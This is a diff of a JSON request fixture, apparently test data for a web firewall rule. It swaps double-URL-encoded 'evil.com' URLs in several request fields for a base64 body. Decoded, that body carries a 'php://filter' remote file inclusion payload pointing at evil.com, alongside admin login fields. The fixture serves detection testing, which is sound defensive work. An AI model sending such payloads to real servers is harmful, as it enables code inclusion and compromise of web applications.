@@ -1,14 +1,14 @@
 {
     "req": [
       {
-        "Type": "ALL",
-        "UA": "http:%252f%252fevil.com%252fexample.php",
-        "Body": "http:%252f%252fevil.com%252fexample.php",
-        "ARGS": "http:%252f%252fevil.com%252fexample.php",
-        "Cookie" : "http:%252f%252fevil.com%252fexample.php",
-        "URL": "null",
-        "Referer" : "null",
-        "Headers": "http:%252f%252fevil.com%252fexample.php"
+        "Type": "Body",
+        "UA": "",
+        "Body": "param=cGFybT1JQGtkbzlpamVnaWVva2Ysa2lua29rZHcwJmxvZ2luPWFkbWluJl90b2tlbj1pZndrYXctOXJpMG9maWdqbzlmZ2tpd245ZGYybzBrZjB3OXRnazMwJmNvbWFuPXBocDovL2ZpbHRlci9yZWFkPXN0cmluZy5yb3QxMy9yZXNvdXJjZT1odHRwOi8vZXZpbC5jb20vaW5kZXgucGhwJnBhcm0yPWZkbmE5cmtpZjJuZGZraWdmamk4OXJrZmoyOXJrMGhnM2o5OHloZmlsZT1sb2dpbi5waHAmcGFzc3dvcmQ9ZmF3aWtmaWF3Z2ZpYXdrZ2l3YWlna29pd2c",
+        "ARGS": "",
+        "Cookie": "",
+        "URL": "",
+        "Referer": "",
+        "Headers": ""
       }
     ]
   }
